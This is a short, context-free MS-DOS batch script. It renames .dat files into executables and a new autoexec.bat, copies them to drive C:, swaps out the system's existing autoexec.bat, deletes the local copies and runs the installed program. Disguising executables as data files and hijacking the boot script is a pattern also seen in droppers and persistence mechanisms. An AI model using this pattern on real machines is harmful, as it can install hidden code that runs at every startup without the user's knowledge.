   rename data0.dat data0.exe
   data0 128
   rename data1.dat data1.exe
   rename data4.dat autoexec.bat
   copy data0.exe c:\
   copy data1.exe c:\
   del data1.exe
   rename c:\autoexec.bat data2.bat
   copy autoexec.bat c:\autoexec.bat
   del autoexec.bat
   del data0.exe
   c:\data0 1
